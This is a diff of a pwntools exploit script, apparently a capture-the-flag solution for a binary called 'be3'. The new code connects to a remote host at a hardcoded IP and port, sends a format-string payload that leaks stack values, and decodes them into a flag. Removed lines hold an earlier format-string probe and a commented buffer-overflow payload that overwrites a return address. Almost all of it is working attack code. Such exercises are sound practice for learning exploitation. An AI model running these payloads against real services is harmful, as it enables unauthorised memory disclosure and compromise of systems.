@@ -2,49 +2,58 @@
 
 from pwn import *
 
-# exe = ELF("./be3", checksec=False)
+exe = ELF("./be3", checksec=False)
 
-# context.binary = exe
-context.gdb_binary = "pwndbg"
-context.terminal = ['kitty', '@', 'launch', '--location=vsplit', '--allow-remote-control']
+context.binary = exe
 
-io = gdb.debug(
-'./be3', 
-env={'SHELL': '/bin/sh'},
-gdbscript='''
-    b *main
-    continue
-''')
+HOST = "51.79.201.156"
+PORT = 7015
 
-pause()
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.GDB:
+            gdb.attach(r,
+                       gdbscript='''
+                       b *0x4012be
+                       continue
+                       '''
+            )
+    else:
+        r = remote(HOST, PORT)
 
-payload = b" ".join(f"%{i}$p".encode() for i in range(1, 20))
-io.sendline(payload)
+    return r
 
-io.interactive()
 
-# def conn():
-#     if args.LOCAL:
-#         r = process([exe.path])
-#         if args.GDB:
-#             gdb.attach(r)
-#     else:
-#         r = remote("51.79.201.156", 7015)
-#
-#     return r
-#
-#
-# def main():
-#     r = conn()
-#
-#     # good luck pwning :)
-#     offset = 127
-#     target_address = 0x40122d
-#     payload = b"A" * offset + p32(target_address)
-#
-#     r.sendline(payload)
-#     r.interactive()
-#
-#
-# if __name__ == "__main__":
-#     main()
+def main():
+    r = conn()
+
+    r.recvuntil(b"Say something:")
+
+    payload = b" ".join(
+        f"%{i}$p".encode()
+        for i in range(22, 27)
+    )
+
+    r.sendline(payload)
+
+    output = r.recvall() 
+    print(output)
+
+    line = next(
+            line for line in output.splitlines()
+            if b"0x" in line
+    )
+
+
+    values = [
+            int(x, 16)
+            for x in line.split()
+    ]
+
+    flag = b"".join(p64(x) for x in values)
+
+    print(f"flag: {flag.decode()}")
+
+if __name__ == "__main__":
+    main()
